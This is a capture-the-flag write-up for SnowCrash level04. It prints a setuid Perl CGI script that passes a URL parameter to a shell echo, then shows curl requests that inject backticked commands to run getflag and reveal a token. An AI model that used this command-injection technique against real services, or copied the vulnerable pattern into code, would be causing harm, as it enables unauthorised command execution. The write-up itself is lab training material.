# Level04

This one was mostly straightforward...

```
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

There is a pearl script. On `cat` we get some additional information.

```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We get a hint to check localhost:4747.

```
level04@SnowCrash:~$ curl localhost:4747

```

We do not get an error nor anything in return. So there is something....
Looking back at the content of the file we get another hint with the paramenter `x=`.
It seems to execute `echo` on whatever you give it... lets try it out....

```

level04@SnowCrash:~$ curl localhost:4747?x=pwd
pwd
level04@SnowCrash:~$ curl localhost:4747?x=`pwd`
/home/user/level04
```

It seems we can exploit this. Lets see if we can use getflag.

Blue team was aware of this exploit...

```
level04@SnowCrash:~$ curl localhost:4747?x=`getflag`
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''
```

Maybe if we avoid the client-side evaluation completly...
We can do it in quotes...

```
level04@SnowCrash:~$ curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Reason is, is that `bash` translates getflag for you, but you do not want that as level04 user, but as flag04 user
